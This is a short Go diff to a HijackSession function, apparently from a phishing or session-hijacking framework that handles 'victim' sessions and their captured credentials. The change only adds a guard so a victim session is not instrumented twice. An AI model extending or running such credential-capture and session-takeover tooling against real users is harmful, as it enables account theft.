@@ -773,6 +773,15 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		return
 	}
 
+	// Prevent the session from being instrumented twice
+	if victim.SessionInstrumented {
+		t.Debug("session %s already instrumented, skipping HijackSession", victim.ID)
+		return
+	}
+
+	// Set the flag BEFORE calling Instrument to prevent races
+	_ = db.SetSessionAsInstrumented(victim.ID)
+
 	// Pass credentials
 	creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
 	if err != nil {
